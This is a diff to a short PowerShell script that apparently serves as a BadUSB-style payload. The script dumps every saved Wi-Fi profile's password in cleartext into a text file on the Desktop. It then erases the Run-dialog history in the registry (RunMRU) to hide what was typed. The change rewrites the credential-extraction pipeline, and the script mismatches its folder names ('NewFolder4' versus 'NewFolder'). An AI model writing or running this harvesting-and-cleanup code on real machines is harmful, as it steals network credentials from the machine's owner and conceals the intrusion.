@@ -2,7 +2,15 @@ cd $env:USERPROFILE\Desktop;
 New-Item -ItemType Directory -Name "NewFolder4";
 cd NewFolder;
 
-(netsh wlan show profiles) | Select-String '\s*:\s*(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+:\s*(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize  | Out-File wifi_passwords.txt
+
+(netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
+    $name = $_ -replace '^\s+All User Profile\s+:\s+', ''; 
+    (netsh wlan show profile name="$name" key=clear) 
+} | Select-String "Key Content\W+:(.+)$" | ForEach-Object {
+    $pass = $_ -replace '^\s+Key Content\s+:\s+', ''; 
+    [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
+} | Format-Table -AutoSize | Out-File wifi_passwords.txt;
+
 
 
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
